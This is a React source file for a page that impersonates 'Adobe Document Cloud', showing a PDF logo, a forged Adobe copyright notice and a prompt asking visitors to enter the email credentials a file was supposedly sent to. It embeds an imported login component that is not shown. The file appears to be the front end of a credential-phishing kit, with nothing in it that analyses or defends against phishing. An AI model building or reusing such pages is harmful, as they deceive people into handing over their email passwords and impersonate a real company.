import React from 'react'
import PerClick from './PerCLick'
import PdfLogo from "../assets/nwoff/pdflogo.jpeg"


const HomePage = () => {
  const currentYear = new Date().getFullYear();

  return (
    <div>
    <div className='py-2 pt-16'>
    <div className="mx-auto">
      <div className="md:w-128 w-full mx-auto p-6 h-auto mx-auto bg-black opacity-80 text-white rounded-2xl">
          <div className='text-center'>
            <img src={PdfLogo} alt='' className='mx-auto w-24 h-24' />
            <div className='md:text-2xl text-lg font-bold mt-2'>Adobe Document Cloud</div>
            <div className='md:text-lg test-sm mt-1'>To read the document, please enter with the valid email credentials that this file was sent to.</div>
          </div>
        <div className='mx-auto'>
        <PerClick />
       </div>
        <div className='text-center my-6'>
           <div className='md:text-lg test-sm mt-1'>Select your email provider to view Document
           </div>
           <div className='md:text-lg test-sm mt-1'>CopyRight &copy; {currentYear} Adobe.</div>
        </div>
      </div>
    </div>
    </div>
    </div>
  )
}

export default HomePage
